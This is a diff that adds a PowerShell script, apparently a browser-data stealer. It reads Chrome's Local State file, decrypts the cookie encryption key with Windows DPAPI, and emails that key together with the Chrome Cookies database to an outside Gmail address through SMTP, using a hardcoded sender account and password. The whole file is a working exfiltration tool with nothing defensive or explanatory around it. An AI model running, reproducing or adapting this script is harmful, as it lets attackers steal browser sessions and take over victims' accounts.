@@ -1,0 +1,44 @@
+Add-Type -Assembly System.Security
+$ExtensionFile = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Local State"
+$protectedDataPath = "$($env:HOMEPATH)\Downloads\enc.cookie.bin"
+$jsondata = Get-Content -Raw -Path $ExtensionFile | ConvertFrom-Json
+$encKey = [System.Convert]::FromBase64String($jsondata.os_crypt.encrypted_key.ToString());
+$encKey= $encKey[5..$encKey.Length];
+ 
+$decryptedKey = [Security.Cryptography.ProtectedData]::Unprotect($enckey,$null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+
+ 
+$s= "$(($decryptedKey|ForEach-Object ToString X2) -join '')"
+
+#Write-Host ($decryptedKey)  -join ','
+
+#Write-Host ($decryptedKey | %{$_ -replace '$',','})
+
+$ke = ($decryptedKey | %{$_ -replace '$',','})
+
+#echo $ke
+
+
+
+$Username = "senmn0w@gmail.com";
+$Password = "send@2021";
+$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\default\Network\Cookies"
+function Send-ToEmail([string]$email, [string]$attachmentpath){
+
+    $message = new-object Net.Mail.MailMessage;
+    $message.From = "senmn0w@gmail.com";
+    $message.To.Add($email);
+    $message.Subject = "alert!";
+    $message.Body = $ke;
+    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
+    $message.Attachments.Add($attachment);
+
+    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
+    $smtp.EnableSSL = $true;
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+    $smtp.send($message);
+    write-host "Mail Sent" ; 
+    $attachment.Dispose();
+ }
+Send-ToEmail  -email "mohamed.trabelsi.ena2@gmail.com" -attachmentpath $path;
